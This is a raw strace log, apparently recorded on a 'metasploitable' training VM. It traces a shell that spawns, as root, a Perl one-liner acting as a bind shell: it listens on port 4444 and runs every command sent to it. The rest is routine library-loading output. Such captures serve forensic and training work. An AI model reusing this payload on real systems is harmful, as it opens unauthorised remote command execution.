8189  07:22:17.411511 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7df6000
8189  07:22:17.411522 mmap2(0xb7e0a000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7e0a000
8189  07:22:17.411536 mmap2(0xb7e0c000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7e0c000
8189  07:22:17.411550 close(1)          = 0
8189  07:22:17.411575 munmap(0xb7f9c000, 29913) = 0
8189  07:22:17.411592 open("/etc/ld.so.cache", O_RDONLY) = 1
8189  07:22:17.411604 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
8189  07:22:17.411620 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f9c000
8189  07:22:17.411629 close(1)          = 0
8189  07:22:17.411639 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8189  07:22:17.411653 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
8189  07:22:17.411667 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
8189  07:22:17.411754 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
8189  07:22:17.411819 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dec000
8189  07:22:17.411848 mmap2(0xb7df4000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7df4000
8189  07:22:17.411895 close(1)          = 0
8189  07:22:17.411907 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8189  07:22:17.411920 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
8189  07:22:17.411938 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
8189  07:22:17.412024 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
8189  07:22:17.412041 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7de1000
8189  07:22:17.412052 mmap2(0xb7dea000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7dea000
8189  07:22:17.412067 close(1)          = 0
8189  07:22:17.412087 munmap(0xb7f9c000, 29913) = 0
8189  07:22:17.412103 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
8189  07:22:17.412117 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
8189  07:22:17.412128 _llseek(1, 0, [0], SEEK_CUR) = 0
8189  07:22:17.412140 fstat64(1, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
8189  07:22:17.412155 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 1, 0) = 0xb7fa3000
8189  07:22:17.412166 _llseek(1, 1624, [1624], SEEK_SET) = 0
8189  07:22:17.412180 munmap(0xb7fa3000, 1624) = 0
8189  07:22:17.412190 close(1)          = 0
8189  07:22:17.412217 getpgrp()         = 3831
8189  07:22:17.412227 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
8189  07:22:17.412242 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
8189  07:22:17.412276 brk(0x8101000)    = 0x8101000
8189  07:22:17.412365 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
8189  07:22:17.412380 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
8189  07:22:17.412395 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
8189  07:22:17.412445 brk(0x8102000)    = 0x8102000
8189  07:22:17.412470 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
8189  07:22:17.412489 stat64("/sbin/AB", 0xbfe40c98) = -1 ENOENT (No such file or directory)
8189  07:22:17.412501 stat64("/bin/AB", 0xbfe40c98) = -1 ENOENT (No such file or directory)
8189  07:22:17.412512 stat64("/usr/sbin/AB", 0xbfe40c98) = -1 ENOENT (No such file or directory)
8189  07:22:17.412523 stat64("/usr/bin/AB", 0xbfe40c98) = -1 ENOENT (No such file or directory)
8189  07:22:17.412536 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
8189  07:22:17.412550 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e176f8) = 8190
8190  07:22:17.412593 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
8190  07:22:17.412608 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
8190  07:22:17.412621 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
8190  07:22:17.412632 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
8190  07:22:17.412647 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
8190  07:22:17.412662 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
8190  07:22:17.412674 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
8190  07:22:17.412743 write(2, "sh: AB: command not found\n", 26) = -1 EPIPE (Broken pipe)
8190  07:22:17.412757 --- SIGPIPE (Broken pipe) @ 0 (0) ---
8190  07:22:17.412866 exit_group(127)   = ?
8189  07:22:17.438282 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
4519  07:22:17.438310 waitpid(8189,  <unfinished ...>
8189  07:22:17.438328 <... rt_sigprocmask resumed> NULL, 8) = 0
8189  07:22:17.438335 --- SIGCHLD (Child exited) @ 0 (0) ---
8189  07:22:17.438350 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 8190
8189  07:22:17.438368 waitpid(-1, 0xbfe40918, WNOHANG) = -1 ECHILD (No child processes)
8189  07:22:17.438379 sigreturn()       = ? (mask now [])
8189  07:22:17.438403 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
8189  07:22:17.438418 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
8189  07:22:17.438429 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
8189  07:22:17.438442 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
8189  07:22:17.438461 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
8189  07:22:17.438472 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
8189  07:22:17.438509 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
8189  07:22:17.438530 stat64("/sbin/perl", 0xbfe40cc8) = -1 ENOENT (No such file or directory)
8189  07:22:17.438542 stat64("/bin/perl", 0xbfe40cc8) = -1 ENOENT (No such file or directory)
8189  07:22:17.438554 stat64("/usr/sbin/perl", 0xbfe40cc8) = -1 ENOENT (No such file or directory)
8189  07:22:17.438566 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
8189  07:22:17.438584 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
8189  07:22:17.438610 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
8189  07:22:17.438625 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e176f8) = 8191
8191  07:22:17.438676 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
8191  07:22:17.438692 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
8191  07:22:17.438719 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
8191  07:22:17.438759 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
8191  07:22:17.438775 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
8191  07:22:17.438805 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
8191  07:22:17.438818 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
8191  07:22:17.438854 execve("/usr/bin/perl", ["perl", "-MIO", "-e", "$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};"], [/* 14 vars */]) = 0
8191  07:22:17.438947 brk(0)            = 0x8153000
8191  07:22:17.438967 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8191  07:22:17.438983 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f4e000
8191  07:22:17.438999 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
8191  07:22:17.439022 open("/etc/ld.so.cache", O_RDONLY) = 1
8191  07:22:17.439036 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
8191  07:22:17.439054 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f46000
8191  07:22:17.439064 close(1)          = 0
8191  07:22:17.439075 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8191  07:22:17.439111 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
8191  07:22:17.439140 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
8191  07:22:17.439195 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
8191  07:22:17.439195 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f42000
8191  07:22:17.439195 mmap2(0xb7f44000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f44000
8191  07:22:17.439195 close(1)          = 0
8191  07:22:17.439195 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8191  07:22:17.439196 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 1
8191  07:22:17.439196 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
8191  07:22:17.439196 fstat64(1, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
8191  07:22:17.439196 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f1d000
8191  07:22:17.439197 mmap2(0xb7f40000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x23) = 0xb7f40000
8191  07:22:17.439197 close(1)          = 0
8191  07:22:17.439206 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8191  07:22:17.439220 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 1
8191  07:22:17.439234 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\0004\0\0\0\330C\1\0\0\0\0\0004\0 \0\t\0(\0$\0!\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\224\n\1\0\224\n\1\0\224\n\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4;\1\0\4;\1\0\5\0\0\0\0\20\0\0\1\0\0\0\344=\1\0\344M\1\0\344M\1\0T\3\0\0\374#\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\250\n\1\0\250\n\1\0\250\n\1\0\314\4\0\0\314\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\344=\1\0\344M\1\0\344M\1\0\20\2\0\0\20\2\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\262\1\0\0L\0\0\0@\0\0\0\v\0\0\0\31!\2\221\1\n\20\"@H \331\3\0I4\200\0\0@\0 \200\200\21P`@@\22\213\0020D\0\0\20\0\0\2\0\1\r\0\204\n\360\1X\260\r\240\200\10 $\204\20B\242)m\10G\234V\20\0\224 \204$\10\0H(\1\222\34\301B\240\220\22\10\f \2\30`A\244c\4\0\n\32\3\0\0)\0(\314@\204\210L\22\10\241\0\4\0\10\0\300Q\0\2009\4C\300", 512) = 512
8191  07:22:17.439373 fstat64(1, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
8191  07:22:17.439391 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f1c000
8191  07:22:17.439405 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f04000
8191  07:22:17.439416 mmap2(0xb7f18000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7f18000
8191  07:22:17.439431 mmap2(0xb7f1a000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f1a000
8191  07:22:17.439463 close(1)          = 0
8191  07:22:17.439475 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8191  07:22:17.439488 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
8191  07:22:17.439502 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
8191  07:22:17.439591 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
8191  07:22:17.439608 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7db5000
8191  07:22:17.439619 mmap2(0xb7efe000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7efe000
8191  07:22:17.439634 mmap2(0xb7f01000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f01000
8191  07:22:17.439647 close(1)          = 0
8191  07:22:17.439659 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8191  07:22:17.439672 open("/lib/tls/i686/cmov/libcrypt.so.1", O_RDONLY) = 1
8191  07:22:17.439686 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\7\0\0004\0\0\0<\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340\210\0\0\340\210\0\0\340\210\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\f\212\0\0\f\212\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0`\1\0\0tr\2\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\17\0\0\0\22\0\0\0\2\0\0\0\6\0\0\0\4\311\240, \4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\23\0\0\0\24\0\0\0\0\0\0\0\25\0\0\0\26\0\0\0\0\0\0\0\27\0\0\0\0\0\0\0\30\0\0\0\31\0\0\0\0\0\0\0k\31Qj\233(\375B\233`\205\33\327\16?\17I->\333\235C\r\375\313\373_\22\325=l\366\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0o\0\0\0\0\0\0\0\35\0\0\0\22\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\37\0\0\0\0\0\0\0", 512) = 512
8191  07:22:17.439775 fstat64(1, {st_mode=S_IFREG|0644, st_size=38300, ...}) = 0
8191  07:22:17.439799 mmap2(NULL, 201052, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d83000
8191  07:22:17.439838 mmap2(0xb7d8c000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7d8c000
8191  07:22:17.439868 mmap2(0xb7d8e000, 155996, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7d8e000
8191  07:22:17.439897 close(1)          = 0
8191  07:22:17.439920 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d82000
8191  07:22:17.439933 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d828c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
8191  07:22:17.439997 mprotect(0xb7efe000, 4096, PROT_READ) = 0
8191  07:22:17.440024 munmap(0xb7f46000, 29913) = 0
8191  07:22:17.440037 set_tid_address(0xb7d82908) = 8191
8191  07:22:17.440047 set_robust_list(0xb7d82910, 0xc) = 0
8191  07:22:17.440056 futex(0xbfb0b7a0, 0x81 /* FUTEX_??? */, 1) = 0
8191  07:22:17.440071 rt_sigaction(SIGRTMIN, {0xb7f082c0, [], SA_SIGINFO}, NULL, 8) = 0
8191  07:22:17.440084 rt_sigaction(SIGRT_1, {0xb7f08340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
8191  07:22:17.440096 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
8191  07:22:17.440110 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
8191  07:22:17.440129 uname({sys="Linux", node="metasploitable", ...}) = 0
8191  07:22:17.440176 rt_sigaction(SIGFPE, {SIG_IGN}, {SIG_DFL}, 8) = 0
8191  07:22:17.440221 brk(0)            = 0x8153000
8191  07:22:17.440231 brk(0x8174000)    = 0x8174000
8191  07:22:17.440276 getuid32()        = 0
8191  07:22:17.440294 geteuid32()       = 0
8191  07:22:17.440303 getgid32()        = 0
8191  07:22:17.440337 getegid32()       = 0
8191  07:22:17.440390 mmap2(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d61000
8191  07:22:17.440418 open("/dev/urandom", O_RDONLY|O_LARGEFILE) = 1
8191  07:22:17.440435 read(1, "{j%:", 4) = 4
8191  07:22:17.440447 close(1)          = 0
8191  07:22:17.440466 time(NULL)        = 1495624937
8191  07:22:17.440507 stat64("/usr/local/lib/site_perl/5.8.8/i486-linux-gnu-thread-multi", 0xbfb0b470) = -1 ENOENT (No such file or directory)
8191  07:22:17.440524 stat64("/usr/local/lib/site_perl/5.8.8", 0xbfb0b470) = -1 ENOENT (No such file or directory)
